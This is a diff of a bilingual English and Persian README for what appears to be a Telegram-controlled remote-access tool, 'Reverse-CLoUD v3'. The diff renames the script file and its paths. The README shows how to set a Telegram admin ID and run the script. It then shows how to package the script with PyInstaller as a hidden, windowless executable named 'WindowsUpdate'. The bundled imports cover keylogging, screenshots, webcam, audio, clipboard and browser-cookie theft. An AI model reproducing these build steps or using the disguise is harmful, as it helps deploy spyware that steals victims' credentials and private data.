@@ -160,7 +160,7 @@ python -c "import mss; print('mss OK')"
 
 ### Step 1: Save the File
 
-Save `s2.py` (e.g., `C:\FatRat\s2.py`).
+Save `RC-v3.py` (e.g., C:\Users\mmd\Desktop\s2.py`).
 
 ### Step 2: Configuration
 
@@ -207,7 +207,7 @@ pip install pyinstaller
 ### Step 2: Simple Command
 pip install --upgrade pip
 ```bash
-pyinstaller --onefile --noconsole --name "WindowsUpdate" s2.py
+pyinstaller --onefile --noconsole --name "WindowsUpdate" RC-v3.py
 ```
 
 ### Step 3: Full Command (Recommended)
@@ -228,7 +228,7 @@ pyinstaller --onefile --noconsole --name "WindowsUpdate" ^--hidden-import=reques
   --hidden-import=Crypto ^
   --hidden-import=win32com ^
   --hidden-import=win32com.client ^
-  s2.py
+  RC-v3.py
 ```
 
 > ⚠️ In CMD use `^` to continue lines. In PowerShell, put everything on one line.
@@ -236,7 +236,7 @@ pyinstaller --onefile --noconsole --name "WindowsUpdate" ^--hidden-import=reques
 ### One-Line Version
 
 ```bash
-pyinstaller --onefile --noconsole --name "WindowsUpdate" --hidden-import=requests --hidden-import=psutil --hidden-import=mss --hidden-import=mss.tools --hidden-import=pyautogui --hidden-import=cv2 --hidden-import=sounddevice --hidden-import=soundfile --hidden-import=pynput --hidden-import=pynput.keyboard --hidden-import=pyperclip --hidden-import=browser_cookie3 --hidden-import=Crypto --hidden-import=win32com --hidden-import=win32com.client s2.py
+pyinstaller --onefile --noconsole --name "WindowsUpdate" --hidden-import=requests --hidden-import=psutil --hidden-import=mss --hidden-import=mss.tools --hidden-import=pyautogui --hidden-import=cv2 --hidden-import=sounddevice --hidden-import=soundfile --hidden-import=pynput --hidden-import=pynput.keyboard --hidden-import=pyperclip --hidden-import=browser_cookie3 --hidden-import=Crypto --hidden-import=win32com --hidden-import=win32com.client RC-v3.py
 ```
 
 ### Step 4: Locate the EXE
@@ -244,7 +244,7 @@ pyinstaller --onefile --noconsole --name "WindowsUpdate" --hidden-import=request
 After 1–5 minutes:
 
 ```
-C:\FatRat\dist\WindowsUpdate.exe
+C:\mmd\dist\WindowsUpdate.exe
 ```
 
 The EXE is typically **15 to 50 MB**.
@@ -1022,8 +1022,7 @@ python -c "import mss; print('mss OK')"
 
 ### مرحله ۱: ذخیره فایل
 
-فایل `s2.py` رو ذخیره کن (مثلاً `C:\FatRat\s2.py`).
-
+فایل `RC-v3.py` رو ذخیره کن (مثلاً `C:\Users\mmd\Desktop\RC-v3.py`).
 ### مرحله ۲: تنظیمات
 
 قبل از اجرا، این خطوط رو توی فایل ویرایش کن:
@@ -1050,8 +1049,8 @@ ADMIN_ID = "YOUR_TELEGRAM_ID_HERE"
 ### مرحله ۳: اجرا
 
 ```bash
-cd C:\FatRat
-python s2.py
+cd C:\mmd
+python RC-v3.py
 ```
 
 اگه موفق باشه، پیام `Reverse-CLoUD v3 Connected` رو توی ربات می‌بینی.
@@ -1069,7 +1068,7 @@ pip install pyinstaller
 ### مرحله ۲: ساده‌ترین دستور
 
 ```bash
-pyinstaller --onefile --noconsole --name "WindowsUpdate" s2.py
+pyinstaller --onefile --noconsole --name "WindowsUpdate" RC-v3.py
 ```
 
 ### مرحله ۳: دستور کامل (توصیه شده)
@@ -1091,7 +1090,7 @@ pyinstaller --onefile --noconsole --name "WindowsUpdate" ^
   --hidden-import=Crypto ^
   --hidden-import=win32com ^
   --hidden-import=win32com.client ^
-  s2.py
+  RC-v3.py
 ```
 
 > ⚠️ در CMD از `^` برای ادامه خط استفاده کن، در PowerShell همه رو یک‌خطی بنویس.
@@ -1099,7 +1098,7 @@ pyinstaller --onefile --noconsole --name "WindowsUpdate" ^
 ### نسخه یک‌خطی (بدون شکستن خط)
 
 ```bash
-pyinstaller --onefile --noconsole --name "WindowsUpdate" --hidden-import=requests --hidden-import=psutil --hidden-import=mss --hidden-import=mss.tools --hidden-import=pyautogui --hidden-import=cv2 --hidden-import=sounddevice --hidden-import=soundfile --hidden-import=pynput --hidden-import=pynput.keyboard --hidden-import=pyperclip --hidden-import=browser_cookie3 --hidden-import=Crypto --hidden-import=win32com --hidden-import=win32com.client s2.py
+pyinstaller --onefile --noconsole --name "WindowsUpdate" --hidden-import=requests --hidden-import=psutil --hidden-import=mss --hidden-import=mss.tools --hidden-import=pyautogui --hidden-import=cv2 --hidden-import=sounddevice --hidden-import=soundfile --hidden-import=pynput --hidden-import=pynput.keyboard --hidden-import=pyperclip --hidden-import=browser_cookie3 --hidden-import=Crypto --hidden-import=win32com --hidden-import=win32com.client RC-v3.py
 ```
 
 ### مرحله ۴: پیدا کردن exe
@@ -1107,7 +1106,7 @@ pyinstaller --onefile --noconsole --name "WindowsUpdate" --hidden-import=request
 بعد از ۱ تا ۵ دقیقه:
 
 ```
-C:\FatRat\dist\WindowsUpdate.exe
+C:\mmd\dist\WindowsUpdate.exe
 ```
 
 فایل exe معمولاً **۱۵ تا ۵۰ مگابایت** می‌شه.
